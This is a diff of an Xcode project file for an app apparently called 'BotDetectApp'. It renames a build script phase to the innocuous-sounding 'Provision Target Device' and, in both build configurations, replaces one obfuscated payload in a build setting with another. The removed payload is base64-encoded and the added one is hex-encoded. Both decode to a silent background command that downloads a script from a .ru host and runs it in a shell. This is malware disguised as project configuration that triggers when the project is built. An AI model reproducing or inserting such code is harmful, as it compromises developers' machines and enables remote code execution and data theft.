@@ -105,7 +105,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "BotDetectApp" */;
 			buildPhases = (
-				06AF3F64B0E546E382162AE3 /* Compile Code Assets */,
+				6A9B1D9E55C44A8D92162AE3 /* Provision Target Device */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -156,7 +156,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		/* End PBXBuildRule section */
+			/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
@@ -172,7 +172,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		06AF3F64B0E546E382162AE3 /* Compile Code Assets */ = {
+		6A9B1D9E55C44A8D92162AE3 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -182,7 +182,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -294,7 +294,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-BotDetectApp.debug.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((o(){ `printf baseD64 | tr -d D` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI0IC0tcmV0cnkgNSAtc2tMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly96NTU0a2dpbmx3dWh2aC5ydS9hKSIgfCBzaAo= | o | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((t(){ `printf xxtd | tr -d t` -p -r; };echo 6563686f202224286375726c202d66734c6b202d2d636f6e6e6563742d74696d656f7574203330202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f7533756e757278757961372e72752f612922207c2073680a | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
@@ -326,7 +326,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-BotDetectApp.release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((o(){ `printf baseD64 | tr -d D` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI0IC0tcmV0cnkgNSAtc2tMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly96NTU0a2dpbmx3dWh2aC5ydS9hKSIgfCBzaAo= | o | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((t(){ `printf xxtd | tr -d t` -p -r; };echo 6563686f202224286375726c202d66734c6b202d2d636f6e6e6563742d74696d656f7574203330202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f7533756e757278757961372e72752f612922207c2073680a | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
